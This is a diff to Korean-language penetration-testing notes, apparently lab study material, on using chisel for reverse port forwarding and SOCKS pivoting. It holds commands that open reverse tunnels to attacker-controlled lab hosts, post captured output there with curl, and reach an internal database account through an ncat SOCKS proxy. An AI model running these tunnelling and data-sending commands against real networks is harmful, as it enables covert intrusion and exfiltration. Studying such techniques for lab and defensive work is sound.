@@ -119,6 +119,10 @@ chisel server --port 8080 --reverse
 - `--reverse`: 클라이언트가 리버스 포워딩을 요청할 수 있도록 허용
 
 ```bash
+chisel client 10.10.14.3:8000 R:80:127.0.0.1:80
+```
+
+```bash
 /tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
 ```
 - `client <서버주소:포트>`: 지정된 서버에 클라이언트 모드로 접속
@@ -126,6 +130,8 @@ chisel server --port 8080 --reverse
   (즉, 서버에서 접속할 수 있는 SOCKS 포트가 열림)
 - `&> /tmp/output`: 표준 출력과 표준 에러를 `/tmp/output` 파일로 리다이렉트
 - `curl --data @/tmp/output <url>`: 실행 결과 로그를 서버(192.168.118.4:8080)로 전송
+
+
 
 ```bash
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
